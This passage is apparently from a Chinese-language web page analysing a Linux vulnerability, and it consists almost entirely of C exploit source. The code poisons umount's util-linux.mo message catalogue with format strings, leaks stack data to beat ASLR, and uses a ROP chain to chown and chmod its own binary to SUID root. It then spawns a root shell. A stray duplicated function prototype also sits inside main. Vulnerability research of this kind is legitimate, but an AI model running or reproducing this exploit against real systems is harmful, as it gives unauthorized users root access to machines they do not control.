    result=execve(umountArgs[0], umountArgs, umountEnv);
    assert(!result);
  }
  close(pipeFds[1]);
  int childStdout=pipeFds[0];


  int escalationPhase=0;
  char readBuffer[1024];
  int readDataLength=0;
  char stackData[STACK_LONG_DUMP_BYTES];
  int stackDataBytes=0;


  struct pollfd pollFdList[1];
  pollFdList[0].fd=childStdout;
  pollFdList[0].events=POLLIN;


// Now learn about the binary, prepare data for second exploitation
// phase. The phases should be:
// * 0: umount executes, glibc underflows and causes an util-linux.mo
//   file to be read, that contains a poisonous format string.
//   Successful poisoning results in writing of 8*'A' preamble,
//   we are looking for to indicate end of this phase.
// * 1: The poisoned process writes out stack content to defeat
//   ASLR. Reading all relevant stack end this phase.
// * 2: The poisoned process changes the &quot;LANGUAGE&quot; parameter,
//   thus triggering re-read of util-linux.mo. To avoid races,
//   we let umount open a named pipe, thus blocking execution.
//   As soon as the pipe is ready for writing, we write a modified
//   version of util-linux.mo to another file because the pipe
//   cannot be used for sending the content.
// * 3: We read umount output to avoid blocking the process and
//   wait for it to ROP execute fchown/fchmod and exit.
  while(1) {
    if(escalationPhase==2) {
// We cannot use the standard poll from below to monitor the pipe,
// but also we do not want to block forever. Wait for the pipe
// in nonblocking mode and then continue with next phase.
      result=waitForTriggerPipeOpen(secondPhaseTriggerPipePathname);
      if(result) {
        goto attemptEscalationCleanup;
      }
      escalationPhase++;
    }


// Wait at most 10 seconds for IO.
    result=poll(pollFdList, 1, 10000);
    if(!result) {
// We ran into a timeout. This might be the result of a deadlocked
// child, so kill the child and retry.
      fprintf(stderr, &quot;Poll timed out\n&quot;);
      goto attemptEscalationCleanup;
    }
// Perform the IO operations without blocking.
    if(pollFdList[0].revents&amp;(POLLIN|POLLHUP)) {
      result=read(
          pollFdList[0].fd, readBuffer+readDataLength,
          sizeof(readBuffer)-readDataLength);
      if(!result) {
        if(escalationPhase&lt;3) {
// Child has closed the socket unexpectedly.
          goto attemptEscalationCleanup;
        }
        break;
      }
      if(result&lt;0) {
        fprintf(stderr, &quot;IO error talking to child\n&quot;);
        goto attemptEscalationCleanup;
      }
      readDataLength+=result;


// Handle the data depending on escalation phase.
      int moveLength=0;
      switch(escalationPhase) {
        case 0: // Initial sync: read A*8 preamble.
          if(readDataLength&lt;8)
            continue;
          char *preambleStart=memmem(readBuffer, readDataLength,
              &quot;AAAAAAAA&quot;, 8);
          if(!preambleStart) {
// No preamble, move content only if buffer is full.
            if(readDataLength==sizeof(readBuffer))
              moveLength=readDataLength-7;
            break;
          }
// We found, what we are looking for. Start reading the stack.
          escalationPhase++;
          moveLength=preambleStart-readBuffer+8;
        case 1: // Read the stack.
// Consume stack data until or local array is full.
          while(moveLength+16&lt;=readDataLength) {
            result=sscanf(readBuffer+moveLength, &quot;%016lx&quot;,
                (long*)(stackData+stackDataBytes));
            if(result!=1) {
// Scanning failed, the data injection procedure apparently did
// not work, so this escalation failed.
              goto attemptEscalationCleanup;
            }
            moveLength+=sizeof(long)*2;
            stackDataBytes+=sizeof(long);
// See if we reached end of stack dump already.
            if(stackDataBytes==sizeof(stackData))
              break;
          }
          if(stackDataBytes!=sizeof(stackData))
            break;


// All data read, use it to prepare the content for the next phase.
          fprintf(stderr, &quot;Stack content received, calculating next phase\n&quot;);


          int *exploitOffsets=(int*)osReleaseExploitData[3];


// This is the address, where source Pointer is pointing to.
          void *sourcePointerTarget=((void**)stackData)[exploitOffsets[ED_STACK_OFFSET_ARGV]];
// This is the stack address source for the target pointer.
          void *sourcePointerLocation=sourcePointerTarget-0xd0;


          void *targetPointerTarget=((void**)stackData)[exploitOffsets[ED_STACK_OFFSET_ARG0]];
// This is the stack address of the libc start function return
// pointer.
          void *libcStartFunctionReturnAddressSource=sourcePointerLocation-0x10;
          fprintf(stderr, &quot;Found source address location %p pointing to target address %p with value %p, libc offset is %p\n&quot;,
              sourcePointerLocation, sourcePointerTarget,
              targetPointerTarget, libcStartFunctionReturnAddressSource);
// So the libcStartFunctionReturnAddressSource is the lowest address
// to manipulate, targetPointerTarget+...


          void *libcStartFunctionAddress=((void**)stackData)[exploitOffsets[ED_STACK_OFFSET_ARGV]-2];
          void *stackWriteData[]={
              libcStartFunctionAddress+exploitOffsets[ED_LIBC_GETDATE_DELTA],
              libcStartFunctionAddress+exploitOffsets[ED_LIBC_EXECL_DELTA]
          };
          fprintf(stderr, &quot;Changing return address from %p to %p, %p\n&quot;,
              libcStartFunctionAddress, stackWriteData[0],
              stackWriteData[1]);
          escalationPhase++;


          char *escalationString=(char*)malloc(1024);
          createStackWriteFormatString(
              escalationString, 1024,
              exploitOffsets[ED_STACK_OFFSET_ARGV]+1, // Stack position of argv pointer argument for fprintf
              sourcePointerTarget, // Base value to write
              exploitOffsets[ED_STACK_OFFSET_ARG0]+1, // Stack position of argv[0] pointer ...
              libcStartFunctionReturnAddressSource,
              (unsigned short*)stackWriteData,
              sizeof(stackWriteData)/sizeof(unsigned short)
          );
          fprintf(stderr, &quot;Using escalation string %s&quot;, escalationString);


          result=writeMessageCatalogue(
              secondPhaseCataloguePathname,
              (char*[]){
                  &quot;%s: mountpoint not found&quot;,
                  &quot;%s: not mounted&quot;,
                  &quot;%s: target is busy\n        (In some cases useful info about processes that\n         use the device is found by lsof(8) or fuser(1).)&quot;
              },
              (char*[]){
                  escalationString,
                  &quot;BBBB5678%3$s\n&quot;,
                  &quot;BBBBABCD%s\n&quot;},
              3);
          assert(!result);
          break;
        case 2:
        case 3:
// Wait for pipe connection and output any result from mount.
          readDataLength=0;
          break;
        default:
          fprintf(stderr, &quot;Logic error, state %d\n&quot;, escalationPhase);
          goto attemptEscalationCleanup;
      }
      if(moveLength) {
        memmove(readBuffer, readBuffer+moveLength, readDataLength-moveLength);
        readDataLength-=moveLength;
      }
    }
  }


attemptEscalationCleanup:
// Wait some time to avoid killing umount even when exploit was
// successful.
  sleep(1);
  close(childStdout);
// It is safe to kill the child as we did not wait for it to finish
// yet, so at least the zombie process is still here.
  kill(childPid, SIGKILL);
  pid_t waitedPid=waitpid(childPid, NULL, 0);
  assert(waitedPid==childPid);


  return(escalationSuccess);
}




/** This function invokes the shell specified via environment
 *  or the default shell &quot;/bin/sh&quot; when undefined. The function
 *  does not return on success.
 *  @return -1 on error
 */
int invokeShell(char *shellName) {
  if(!shellName)
    shellName=getenv(&quot;SHELL&quot;);
  if(!shellName)
    shellName=&quot;/bin/sh&quot;;
  char* shellArgs[]={shellName, NULL};
  execve(shellName, shellArgs, environ);
  fprintf(stderr, &quot;Failed to launch shell %s\n&quot;, shellName);
  return(-1);
}


int main(int argc, char **argv) {
  char *programmName=argv[0];
  int exitStatus=1;


  if(getuid()==0) {
    fprintf(stderr, &quot;%s: you are already root, invoking shell ...\n&quot;,
        programmName);
    invokeShell(NULL);
    return(1);
  }


  if(geteuid()==0) {
    struct stat statBuf;
    int result=stat(&quot;/proc/self/exe&quot;, &amp;statBuf);
    assert(!result);
    if(statBuf.st_uid||statBuf.st_gid) {
      fprintf(stderr, &quot;%s: internal invocation, setting SUID mode\n&quot;,
          programmName);
      int handle=open(&quot;/proc/self/exe&quot;, O_RDONLY);
      fchown(handle, 0, 0);
      fchmod(handle, 04755);
      exit(0);
    }


    fprintf(stderr, &quot;%s: invoked as SUID, invoking shell ...\n&quot;,
        programmName);
    setresgid(0, 0, 0);
    setresuid(0, 0, 0);
    invokeShell(NULL);
    return(1);
  }


  for(int argPos=1; argPos&lt;argc;) {
    char *argName=argv[argPos++];
    if(argPos==argc) {
      fprintf(stderr, &quot;%s requires parameter\n&quot;, argName);
      return(1);
    }
    if(!strcmp(&quot;--Pid&quot;, argName)) {
      char *endPtr;
      namespacedProcessPid=strtoll(argv[argPos++], &amp;endPtr, 10);
      if((errno)||(*endPtr)) {
        fprintf(stderr, &quot;Invalid pid value\n&quot;);
        return(1);
      }
      killNamespacedProcessFlag=0;
    } else {
      fprintf(stderr, &quot;Unknown argument %s\n&quot;, argName);
      return(1);
    }
  }


  fprintf(stderr, &quot;%s: setting up environment ...\n&quot;, programmName);


  if(!osRelease) {
    if(detectOsRelease()) {
      fprintf(stderr, &quot;Failed to detect OS version, continuing anyway\n&quot;);
    }
  }


  umountPathname=findUmountBinaryPathname(&quot;/bin&quot;);
  if((!umountPathname)&amp;&amp;(getenv(&quot;PATH&quot;)))
    umountPathname=findUmountBinaryPathname(getenv(&quot;PATH&quot;));
  if(!umountPathname) {
    fprintf(stderr, &quot;Failed to locate \&quot;umount\&quot; binary, is PATH correct?\n&quot;);
    goto preReturnCleanup;
  }
  fprintf(stderr, &quot;%s: using umount at \&quot;%s\&quot;.\n&quot;, programmName,
      umountPathname);


  pid_t nsPid=prepareNamespacedProcess();
  if(nsPid&lt;0) {
    goto preReturnCleanup;
  }


// Gaining root can still fail due to ASLR creating additional
// path separators in memory addresses residing in area to be
// overwritten by buffer underflow. Retry regaining until this
// executable changes uid/gid.
  int escalateMaxAttempts=10;
  int excalateCurrentAttempt=0;
  while(excalateCurrentAttempt&lt;escalateMaxAttempts) {
    excalateCurrentAttempt++;
    fprintf(stderr, &quot;Attempting to gain root, try %d of %d ...\n&quot;,
        excalateCurrentAttempt, escalateMaxAttempts);


    attemptEscalation();


    struct stat statBuf;
    int statResult=stat(&quot;/proc/self/exe&quot;, &amp;statBuf);
       int stat(const char *pathname, struct stat *buf);
    if(statResult) {
      fprintf(stderr, &quot;Failed to stat /proc/self/exe: /proc not mounted, access restricted, executable deleted?\n&quot;);
      break;
    }
    if(statBuf.st_uid==0) {
      fprintf(stderr, &quot;Executable now root-owned\n&quot;);
      goto escalateOk;
    }
  }


  fprintf(stderr, &quot;Escalation FAILED, maybe target system not (yet) supported by exploit!\n&quot;);


preReturnCleanup:
  if(namespacedProcessPid&gt;0) {
    if(killNamespacedProcessFlag) {
      kill(namespacedProcessPid, SIGKILL);
    } else {
// We used an existing namespace or chroot to escalate. Remove
// the files created there.
      fprintf(stderr, &quot;No namespace cleanup for preexisting namespaces yet, do it manually.\n&quot;);
    }
  }


  if(!exitStatus) {
    fprintf(stderr, &quot;Cleanup completed, re-invoking binary\n&quot;);
    invokeShell(&quot;/proc/self/exe&quot;);
    exitStatus=1;
  }
  return(exitStatus);


escalateOk:
  exitStatus=0;
  goto preReturnCleanup;
}

</code></pre>
              
            </div>
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="../cve-2019-12735-分析/" class="btn btn-neutral float-right" title="Cve 2019 12735 分析">Next <span class="icon icon-circle-arrow-right"></span></a>
      
      
        <a href="../cve-2018-1000001-分析/" class="btn btn-neutral" title="Cve 2018 1000001 分析"><span class="icon icon-circle-arrow-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <!-- Copyright etc -->
    
  </div>

  Built with <a href="http://www.mkdocs.org">MkDocs</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
</footer>
	  
        </div>
      </div>

    </section>
    
  </div>

  <div class="rst-versions" role="note" style="cursor: pointer">
    <span class="rst-current-version" data-toggle="rst-current-version">
      
      
        <span><a href="../cve-2018-1000001-分析/" style="color: #fcfcfc;">&laquo; Previous</a></span>
      
      
        <span style="margin-left: 15px"><a href="../cve-2019-12735-分析/" style="color: #fcfcfc">Next &raquo;</a></span>
      
    </span>
</div>
    <script src="../../js/theme.js"></script>

</body>
</html>
